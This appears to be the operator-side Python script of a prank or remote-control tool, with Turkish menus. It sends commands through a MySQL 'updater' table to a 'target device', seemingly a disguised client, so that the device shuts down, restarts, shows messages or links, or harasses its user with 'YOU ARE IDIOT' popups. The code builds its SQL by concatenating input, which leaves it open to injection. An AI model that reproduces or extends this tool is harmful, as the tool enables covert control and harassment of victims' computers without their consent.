import os,sys
from termcolor import colored
from datetime import *
import time
import mysql.connector
import socket
from tkinter import messagebox
from termcolor import colored
from time import sleep
from os import system, name
from colorama import init, Fore, Back, Style
import time
import os
import sys
import fade
from pystyle import Write, Colors, Colorate, Center
import colorama
from termcolor import colored
from time import sleep
from os import system, name
from colorama import init, Fore, Back, Style





host = "192.168.1.21"
port = 12345

os.system('cls' if os.name in ('nt', 'dos') else 'clear')

banner = """
                                                                        ▒
                                                                        ░█
                                                                        ███
                                                                        ██ღ█
                                                                        ██ღ▒█──────▒█
                                                                        ██ღ░▒█───────██
                                                                        █ღ░░ღ█──────█ღ▒█
                                                                    █▒ღ░▒ღ░█───██░ღღ█
                                                                    ░█ღ▒░░▒ღ░████ღღღ█
                                                            ░       █▒ღ▒░░░▒ღღღ░ღღღ██     ░█
                                                            ▓█     ░█ღ▒░░░░░░░▒░ღღ██     ▓█░
                                                             ██     █▒ღ░░░░░░░░░░ღ█    ▓▓██
                                                            ██    ██ღ▒░░░░░░░░░ღ██ ░██ღ▒█
                                                            ██ღ█  ██ღ░▒░░░░░░░░░░ღ▓██▒ღღ█
                                                            █ღღ▓██▓ღ░░░▒░░░░░░░░▒░ღღღ░░▓█
                                                            ██ღ▒▒ღღ░░ღღღღ░░▒░░░░ ღღღღ░░ღღღ██
                                                            █ღ▒ღღ█████████ღღ▒░ღ██████████ღ▒█░
                                                        ██ღღ▒████████████ღღ████████████░ღ█▒
                                                        █░ღღ████████████████████████████ღღ█
                                                        █▒ღ██████████████████████████████ღ█
                                                        ██ღღ████████████████████████████ღ██
                                                            ██ღღ██████████████████████████ღ██
                                                            ░██ღღ██████████████████████ღღ██
                                                            ▓██ღ▒██████████████████▒ღ██
                                                            ░  ░███ღ▒████████████▒ღ███
                                                            ░░   ▒██ღღ████████▒ღ██
                                                                    ▒██ღ██████ღ██
                                                                        ██ღ████ღ█
                                                                        █ღ██ღ█
                                                                        █ღღ█
                                                                        █ღ█░
                                                                        ██░                                       
"""
os.system("mode con cols=119 lines=26")
os.system('cls' if os.name in ('nt', 'dos') else 'clear')
banner1 = fade.purplepink(banner)
print(banner1)




cnx = mysql.connector.connect(user = 'root', password = 'DB PASSWORD', host='DB IP ADRESS', database='DB NAME')
cursor = cnx.cursor()




def MAİN():
    os.system('cls' if os.name in ('nt', 'dos') else 'clear')
    banner1 = fade.purplepink(banner)
    print(banner1)
    print(colored(
                """
[1] SHUT DOWN       (Hedef Cihazı Kapatır)
[2] RESTART         (Hedef Cihazı Yeniden Başlatır)
[3] SHOW MESSAGE    (Hedef Cihaza Mesaj Gönderir)
[4] SHOW LİNK       (Hedef Cihaza Link Gönderir)
[5] YOU ARE İDİOT   (Hedef Cihazı Taciz Eder)
[6] SEND HEART<3    (Hedef Cihaza Kalp Gönderir)



                """, "green"))
    COMMAND = input("---> ")

    while True: 
            if COMMAND == "1" or COMMAND == "KAPAT" or COMMAND == "kapat" or COMMAND == "Kapat" or COMMAND == "shutdown" or COMMAND == "Shutdown":
                try:
                            cursor = cnx.cursor()
                            cursor.execute("SELECT askupdate, message FROM updater")
                            data = cursor.fetchone()
                            
          
                            sql1 = "UPDATE updater SET askupdate ='KAPAT'"
                            cursor.execute(sql1)
                            cnx.commit()


                            print(colored("[+] Hedef Cihaz Kapatıldı.","green"))
                            time.sleep(3)
                            MAİN()
                        
                except:
                            print(colored("Bir Hata Oluştu.","red"))
                            time.sleep(3)
                            MAİN()

      
            if COMMAND == "2" or COMMAND == "YENİDEN BAŞLAT" or COMMAND == "yeniden başlat" or COMMAND == "Yeniden Başlat" or COMMAND == "restart" or COMMAND == "Restart":
                try:
                            cursor = cnx.cursor()
                            cursor.execute("SELECT askupdate, message FROM updater")
                            data = cursor.fetchone()
                                            
                            sql1 = "UPDATE updater SET askupdate ='YENİDEN'"
                            cursor.execute(sql1)
                            cnx.commit()


                            print(colored("[+] Hedef Cihaz Kapatıldı.","green"))
                            time.sleep(3)
                            MAİN()
                        
                except:
                            print(colored("Bir Hata Oluştu.","red"))
                            time.sleep(3)
                            MAİN()


            if COMMAND == "3" or COMMAND == "BİLGİ GÖSTER" or COMMAND == "bilgi göster" or COMMAND == "Bilgi Göster" or COMMAND == "show message" or COMMAND == "Show Message":
                try:
                            cursor = cnx.cursor()
                            cursor.execute("SELECT askupdate, message FROM updater")
                            data = cursor.fetchone()
                            
                            mesaj=input("Mesajın: ")

                                
                            sql1 = "UPDATE updater SET askupdate ='INFO"
                            sql2 = "UPDATE updater SET message ='"+mesaj+"'"
                            cursor.execute(sql1)
                            cursor.execute(sql2)
                            cnx.commit()


                            print(colored("[+] Hedef Cihaza Mesaj Gönderildi.","green"))
                            time.sleep(3)
                            MAİN()
                        
                except:
                            print(colored("Bir Hata Oluştu.","red"))
                            time.sleep(3)
                            MAİN()


            if COMMAND == "4" or COMMAND == "LİNK GÖSTER" or COMMAND == "link göster" or COMMAND == "Link Göster" or COMMAND == "show link" or COMMAND == "Show Link":
                try:
                            cursor = cnx.cursor()
                            cursor.execute("SELECT askupdate, message FROM updater")
                            data = cursor.fetchone()
                                
                            mesaj=input("Link: ")

                                
                            sql1 = "UPDATE updater SET askupdate ='LİNK'"
                            sql2 = "UPDATE updater SET message ='"+mesaj+"'"
                            cursor.execute(sql1)
                            cursor.execute(sql2)
                            cnx.commit()


                            print(colored("[+] Hedef Cihaza Link Gönderildi.","green"))
                            time.sleep(3)
                            MAİN()
                        
                except:
                            print(colored("Bir Hata Oluştu.","red"))
                            time.sleep(3)
                            MAİN()


            if COMMAND == "5" or COMMAND == "YOU ARE AN İDİOT" or COMMAND == "you are an idiot" or COMMAND == "You Are An İdiot" or COMMAND == "you are an idiot" or COMMAND == "You Are An İdiot":
                try:
                            cursor = cnx.cursor()
                            cursor.execute("SELECT askupdate, message FROM updater")
                            data = cursor.fetchone()
                                
                            mesaj=input("Mesajın: ")

                                
                            sql1 = "UPDATE updater SET askupdate ='İDİOT'"
                            sql2 = "UPDATE updater SET message ='"+mesaj+"'"
                            cursor.execute(sql1)
                            cursor.execute(sql2)
                            cnx.commit()


                            print(colored("[+] Hedef Cihaz Taciz Edildi.","green"))
                            time.sleep(3)
                            MAİN()
                        
                except:
                            print(colored("Bir Hata Oluştu.","red"))
                            time.sleep(3)
                            MAİN()


            if COMMAND == "6" or COMMAND == "KALP GÖSTER" or COMMAND == "kalp göster" or COMMAND == "Kalp Göster" or COMMAND == "show heart" or COMMAND == "Show Heart":
                    try:
                                cursor = cnx.cursor()
                                cursor.execute("SELECT askupdate, message FROM updater")
                                data = cursor.fetchone()
                                    
                                mesaj=input("Mesajın: ")

                                    
                                sql1 = "UPDATE updater SET askupdate ='KALP'"
                                sql2 = "UPDATE updater SET message ='"+mesaj+"'"
                                cursor.execute(sql1)
                                cursor.execute(sql2)
                                cnx.commit()



                                print(colored("[+] Hedef Cihaza Kalp Gönderildi.","green"))
                                time.sleep(3)
                                MAİN()
                            
                    except:
                                print(colored("Bir Hata Oluştu.","red"))
                                time.sleep(3)
                                MAİN()


            welcome = Fore.RED + "You Are Redirected To The Menu...\n"
            for char in welcome:
                    sys.stdout.write(char)
                    sys.stdout.flush()
                    time.sleep(0.03)
            MAİN()



        

MAİN()